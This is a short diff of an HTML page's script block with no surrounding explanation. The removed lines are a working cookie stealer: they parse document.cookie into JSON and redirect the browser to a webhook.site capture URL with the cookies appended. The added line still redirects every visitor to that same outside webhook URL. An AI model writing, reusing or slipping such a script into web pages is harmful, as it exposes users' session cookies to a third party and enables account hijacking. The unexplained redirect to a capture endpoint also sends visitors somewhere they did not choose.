@@ -6,22 +6,6 @@
 </html>
 
 <script>
-  // 1. Check if there are cookies to parse
-  if (document.cookie) {
-    // 2. Convert the cookie string into a clean JSON object
-    const cookieJson = Object.fromEntries(
-      document.cookie.split('; ').map(c => {
-        const [key, ...val] = c.split('=');
-        return [key, decodeURIComponent(val.join('='))];
-      })
-    );
-
-    // 3. Turn the object into a JSON string and redirect
-    const jsonString = JSON.stringify(cookieJson);
-    document.location = 'https://webhook.site/c3026b43-2570-4abc-98b0-86c73812c9af' + encodeURIComponent(jsonString);
-  } else {
-    // Fallback if no cookies exist
-    document.location = 'https://webhook.site/c3026b43-2570-4abc-98b0-86c73812c9af' + encodeURIComponent(JSON.stringify({error: "No cookies found"}));
-  }
+  document.location.href = `https://webhook.site/c3026b43-2570-4abc-98b0-86c73812c9af`;
 </script>
 
